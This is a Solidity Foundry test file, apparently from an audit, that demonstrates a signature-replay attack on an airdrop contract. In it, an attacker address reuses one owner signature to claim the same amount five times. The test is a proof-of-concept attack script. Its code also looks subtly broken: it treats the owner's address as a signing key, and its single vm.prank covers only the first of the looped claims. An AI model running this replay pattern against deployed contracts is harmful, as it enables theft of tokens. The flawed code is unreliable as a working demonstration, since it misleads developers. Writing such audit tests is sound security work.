// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/guildAuditDrop.sol";

contract AirdropTest is Test {
    Airdrop airdrop;
    address owner;
    address attacker;

    function setUp() public {
        owner = address(this);
        attacker = address(1);
        airdrop = new Airdrop();
    }

    function testSignatureReplayBug() public {
        uint256 amount = 10 ether;

        // Create a valid signature from the owner
        bytes32 message = airdrop.prefixed(keccak256(abi.encodePacked(attacker, amount)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(uint256(uint160(owner)), message);

        // Attacker claims the airdrop multiple times using the same signature
        vm.prank(attacker);
        for (uint256 i = 0; i < 5; i++) {
            airdrop.claim(amount, v, r, s);
        }

        assertEq(airdrop.claimed(attacker), 5 * amount);
    }
}
